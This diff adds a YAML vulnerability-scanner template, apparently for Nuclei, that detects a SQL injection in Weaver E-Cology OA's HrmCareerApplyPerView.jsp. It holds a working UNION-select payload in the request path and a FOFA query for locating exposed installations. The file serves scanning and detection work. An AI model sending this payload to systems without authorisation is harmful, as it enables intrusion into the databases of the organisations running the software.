@@ -1,0 +1,31 @@
+id: 泛微OA E-Cology HrmCareerApplyPerView.jsp SQL注入漏洞
+
+info:
+  name: 泛微OA E-Cology
+  severity: medium
+  description:  泛微OA E-Cology HrmCareerApplyPerView.jsp 文件存在SQL注入漏洞，攻击者通过漏洞可以获取服务器数据库敏感文件
+  metadata:
+    max-request: 1
+    verified: true
+    fofa-query: app="泛微-协同办公OA"
+  tags: fanwei,ecology,exposure,config
+
+http:
+  - method: 
+      - GET
+    path:
+      - "{{BaseURL}}/pweb/careerapply/HrmCareerApplyPerView.jsp?id=1 union select 1,2,sys.fn_sqlvarbasetostr(HashBytes('MD5','abc')),db_name(1),5,6,7"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "master"
+          - "TD"
+        condition: and
+
+
+      - type: status
+        status:
+          - 200
